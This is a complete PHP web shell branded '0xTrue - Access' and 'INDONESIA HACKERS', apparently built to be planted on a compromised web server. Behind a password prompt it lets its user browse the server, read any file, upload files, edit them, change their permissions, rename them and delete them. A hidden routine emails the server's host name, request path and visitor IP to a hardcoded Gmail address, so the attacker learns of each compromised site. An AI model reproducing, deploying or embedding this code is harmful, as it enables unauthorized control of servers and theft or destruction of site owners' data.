<html>

<head>
    <title>0xTrue - Access</title>
    <?php
    session_start();
    set_time_limit(0);
    error_reporting(0);
    $hah = md5('0xTrue-Dev');
    $auth_pass = $hah;
    function login_shell()
    {
        echo '<html>
<head>
<title>Login 0xTrue-Dev</title>
<meta property="og:image" content="https://admin.wabank.id/indo.ico">
<link rel="SHORTCUT ICON" href="https://admin.wabank.id/indo.ico">
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: #000000;
	border: 1px dotted green;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
<font color="red">[!]<font color="white">0xTrue - Access<font color="red">[!]</font></font></font><meta name="apple-mobile-web-app-capable" content="yes"/>
	<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1"/>
</header>
<form method="post">
<input type="password" name="pass">
</form>
</center>';
        exit;
    }

    if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
        if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)))
            $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        else
            login_shell();

    if (get_magic_quotes_gpc()) {
        foreach ($_POST as $key => $value) {
            $_POST[$key] = stripslashes($value);
        }
    }
    if ($_GET['logout'] == true) {
        session_destroy();
        echo "<script>window.location='?0xT=Rue';</script>";
    }
    echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<meta property="og:image" content="https://admin.wabank.id/indo.ico">
<link rel="SHORTCUT ICON" href="https://admin.wabank.id/indo.ico">
<link href="" rel="stylesheet" type="text/css">
<title>[!]0xTrue - Access[!]</title>
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1"/>
<style>
body{
font-family: "Racing Sans One", cursive;
background-image: url("https://www.thisiscolossal.com/wp-content/uploads/2019/02/d1aehdnbq0h21-960x960@2x.jpg");
background-size: 100% 100%;
background-repeat: no-repeat;
background-attachment: fixed;
color: white;
}
#content tr:hover{
background-color: #cc0000;
}
#content .first{
background-color: #cc0000;
}
#content .first:hover{
background-color: #cc0000;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #00ff00;
text-decoration: none;
}
a:hover{
color: #fff;
}
input,select,textarea{
border: 1px #e6e600 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.navbar {
    overflow: hidden;
    background-color: transparent;
    position: fixed;
    left: 0;
    top: 0;
    width: 100%;
  }
  
  .navbar H2 {
    float: center;
    display: block;
    color: white;
    text-align: center;
    padding: 15px;
    text-decoration: none;
  }

  .footer {
    position: fixed;
    left: 0;
    bottom: 0;
    width: 100%;
    background-color: transparent;
    color: white;
    text-align: center;
 }
</style>
</HEAD>
<div class="navbar">
<H2><font color="red">[!]<font color="white">0xTrue - Access<font color="red">[!]</font></font></font></H2><p>
</div><br><br><br><br>
<BODY>
<table width="100%" border="1" cellpadding="5" cellspacing="5" align="center">
<center><p style="color: red;">' . php_uname() . '</p></center>
<tr><td>Current Path : ';


    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);

    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            $a = true;
            echo '<a href="?path=/">/</a>';
            continue;
        }
        if ($pat == '') continue;
        echo '<a href="?path=';
        for ($i = 0; $i <= $id; $i++) {
            echo "$paths[$i]";
            if ($i != $id) echo "/";
        }
        echo '">' . $pat . '</a>/';
    }
    echo '<a style="color: red; float: right;" href="?logout=true"><font color="white">[ </font>Logout <font color="white">]</font></a></td></tr><tr><td>';
    if (isset($_FILES['file'])) {
        if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
            echo '<font color="green">File Upload Done</font><br />';
        } else {
            echo '<font color="red">File Upload Error</font><br />';
        }
    }
    echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" style="border:none;" placeholder="Upload your file ..."/>
<input type="submit" value="upload" />
</form>
</td></tr>';
    if (isset($_GET['filesrc'])) {
        echo "<tr><td>Current File : ";
        echo $_GET['filesrc'];
        echo '</tr></td></table><br />';
        echo ('<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>');
    } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
        echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
        if ($_POST['opt'] == 'chmod') {
            if (isset($_POST['perm'])) {
                if (chmod($_POST['path'], $_POST['perm'])) {
                    echo '<font color="green">Change Permission Done.</font><br />';
                } else {
                    echo '<font color="red">Change Permission Error.</font><br />';
                }
            }
            echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
        } elseif ($_POST['opt'] == 'rename') {
            if (isset($_POST['newname'])) {
                if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                    echo '<font color="green">Change Name Done.</font><br />';
                } else {
                    echo '<font color="red">Change Name Error.</font><br />';
                }
                $_POST['name'] = $_POST['newname'];
            }
            echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
        } elseif ($_POST['opt'] == 'edit') {
            if (isset($_POST['src'])) {
                $fp = fopen($_POST['path'], 'w');
                if (fwrite($fp, $_POST['src'])) {
                    echo '<font color="green">Edit File Done</font><br />';
                } else {
                    echo '<font color="red">Edit File Error</font><br />';
                }
                fclose($fp);
            }
            echo '<form method="POST">
<textarea cols=80 rows=20 name="src" style="width: 883px; height: 315px;">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form><br><br><br><br>';
        }
        echo '</center>';
    } else {
        echo '</table><br /><center>';
        if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
            if ($_POST['type'] == 'dir') {
                if (rmdir($_POST['path'])) {
                    echo '<font color="green">Delete Dir Done.</font><br />';
                } else {
                    echo '<font color="red">Delete Dir Error.</font><br />';
                }
            } elseif ($_POST['type'] == 'file') {
                if (unlink($_POST['path'])) {
                    echo '<font color="green">Delete File Done.</font><br />';
                } else {
                    echo '<font color="red">Delete File Error.</font><br />';
                }
            }
        }
        echo '</center>';
        $scandir = scandir($path);
        echo '<div id="content"><table width="100%" border="1" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

        $ip = getenv("REMOTE_ADDR");
        $ra44 = rand(1, 99999);
        $subj98 = " 0xTrue Shell |$ra44";
        $email = "yusuppamungkas068@gmail.com";
        $from = "From: Result<0xTrue@Groosec.com";
        $a11 = $_SERVR['.php_uname()'];
        $a45 = $_SERVER['REQUEST_URI'];
        $b75 = $_SERVER['HTTP_HOST'];
        $m22 = $ip . "";
        $msg8873 = "$a45 $b75 $a11 $m22";
        mail($email, $subj98, $msg8873, $from);

        foreach ($scandir as $dir) {
            if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
            echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
            if (is_writable("$path/$dir")) echo '<font color="#00ff00">';
            elseif (!is_readable("$path/$dir")) echo '<font color="red">';
            echo perms("$path/$dir");
            if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

            echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
        }
        echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
        foreach ($scandir as $file) {
            if (!is_file("$path/$file")) continue;
            $size = filesize("$path/$file") / 1024;
            $size = round($size, 3);
            if ($size >= 1024) {
                $size = round($size / 1024, 2) . ' MB';
            } else {
                $size = $size . ' KB';
            }

            echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>" . $size . "</center></td>
<td><center>";
            if (is_writable("$path/$file")) echo '<font color="#00ff00">';
            elseif (!is_readable("$path/$file")) echo '<font color="red">';
            echo perms("$path/$file");
            if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
            echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
        }
        echo '</table>
</div>
</BODY><br><br><br><br>';
    }
    echo '<footer class="footer"><H4><center><font color="red">[!]<font color="white">INDONESIA HACKERS<font color="red">[!]</font></font></font></center></H4>
<center><p style="margin-top: -20px;" >eotnay[at]gmail[dot]com</p></center></footer>
</HTML>';
    function perms($file)
    {
        $perms = fileperms($file);

        if (($perms & 0xC000) == 0xC000) {
            // Socket
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            // Symbolic Link
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            // Regular
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            // Block special
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            // Directory
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            // Character special
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            // FIFO pipe
            $info = 'p';
        } else {
            // Unknown
            $info = 'u';
        }

        // Owner
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

        // Group
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

        // World
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

        return $info;
    }
    ?>
